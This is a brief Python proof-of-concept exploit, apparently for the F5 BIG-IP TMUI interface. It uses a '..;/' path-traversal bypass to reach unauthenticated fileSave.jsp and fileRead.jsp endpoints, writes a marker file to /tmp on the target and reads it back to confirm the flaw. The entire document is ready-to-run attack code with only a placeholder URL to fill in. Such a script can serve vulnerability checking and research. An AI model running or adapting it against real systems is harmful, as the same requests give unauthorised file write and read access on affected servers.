#! coding=utf-8
import requests
import uuid


def exploit(url):

    fileSave_url =url+'/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp'
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0',
    }
    fileName =str(uuid.uuid1())
    datas = {"fileName": "/tmp/{}".format(fileName),
             "content":"this_isAF1let0_proveTheVuLnErab1lity_1s_exIstEd"
             }
    fileRead_url =url+'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/%s' % fileName
    try:
        res=requests.post(url=fileSave_url,data=datas,headers=headers,timeout=10,verify=False,allow_redirects=False)
        if res.status_code==200:
            res2=requests.get(url=fileRead_url,headers=headers,verify=False)
            if "this_isAF1let0_proveTheVuLnErab1lity_1s_exIstEd" in res2.text:
                print(url + '   YES')
                return True
    except:
        return False
    return False

if __name__ == '__main__':
    exploit('https://ip')
